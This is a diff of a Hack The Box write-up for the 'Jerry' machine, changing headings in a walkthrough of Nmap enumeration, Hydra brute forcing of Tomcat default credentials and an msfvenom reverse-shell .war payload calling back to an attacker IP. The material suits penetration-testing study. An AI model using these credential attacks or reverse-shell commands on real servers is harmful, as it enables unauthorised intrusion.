@@ -1,14 +1,14 @@
 # HTB - Jerry
 
-##### Ip: 10.10.10.95
-##### Name: Jerry
-##### Rating: Easy
+#### Ip: 10.10.10.95
+#### Name: Jerry
+#### Rating: Easy
 
 ------------------------------------------------
 
 ![Jerry.png](../assets/jerry_assets/Jerry.png)
 
-#### Enumeration
+### Enumeration
 
 As always, lets kick things off with an Nmap scan covering all TCP ports. Because I'm not worried about traffic or the 'noise' I'm making, I'm adding the `--min-rate 10000` attribute to speed things along:
 
@@ -59,9 +59,9 @@ Great! Navigating to the /manager directory in the browser I'm met with a login 
 
 ![login_page.png](../assets/jerry_assets/login_page.png)
 
-#### Brute Forcing
+### Brute Forcing
 
-Based on passed experience I know that Tomcat has a few different default passwords that are used during setup, and sometimes Administrators fail to change these credentials. Lets use Hydra to try and brute force these credentials, but rather than just using the standard rockyou.txt wordlist, in this case I'll try something more targeted to the specific service. There is a phenomenal wordlist package called SecLists available for download at https://github.com/danielmiessler/SecLists. This package contains multiple lists for directory fuzzing, wordlists for usernames and passwords, and more. Specifically of interest for us on Jerry, it also contains a list featuring default credentials for Tomcat. 
+Based on past experience I know that Tomcat has a few different default passwords that are used during setup, and sometimes Administrators fail to change these credentials. Lets use Hydra to try and brute force these credentials, but rather than just using the standard rockyou.txt wordlist, in this case I'll try something more targeted to the specific service. There is a phenomenal wordlist package called SecLists available for download at https://github.com/danielmiessler/SecLists. This package contains multiple lists for directory fuzzing, wordlists for usernames and passwords, and more. Specifically of interest for us on Jerry, it also contains a list featuring default credentials for Tomcat. 
 
 To me it always makes sense to try more targeted wordlsists first, and for a couple different reasons.
 
@@ -85,7 +85,7 @@ Scrolling down the page we see  there is an option to upload and deploy a .war f
 
 This will be the ticket onto the machine. Lets go ahead and generate a reverse shell .war file using msfvenom:
 
-#### Exploitation
+### Exploitation
 
 ```text
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.24 LPORT=443 -f war > rev_shell.war
@@ -101,7 +101,7 @@ Navigating to the Administrators desktop I see that both flags are in the '2 for
 
 ![both_flags.png](../assets/jerry_assets/both_flags.png)
 
-#### Something Extra
+### Something Extra
 
 Funnily enough, in this case, brute forcing wasn't even needed. After a failed login attempt at /manager, we are redirected to a 403: Access Denied page, which contains some 'helpful' instructions:
 
@@ -109,7 +109,7 @@ Funnily enough, in this case, brute forcing wasn't even needed. After a failed l
 
 We can see here the default (but working) credentials listed as an example. To me, it always makes sense to start simple and throw a quick admin:admin or admin:password at a login page, or to try any example credentials you find before kicking off a brute forcing or dictionary attack.
 
-#### Key Takeaways
+### Key Takeaways
 
 - As a user or administrator, make sure you always change your default credentials when setting up services. Conversely, as an attacker, it's always a good idea to try known default credentials or other easy quick wins (root:root, admin:passwd, etc), before getting too technical or trying nosiy methods like brute forcing. 
 
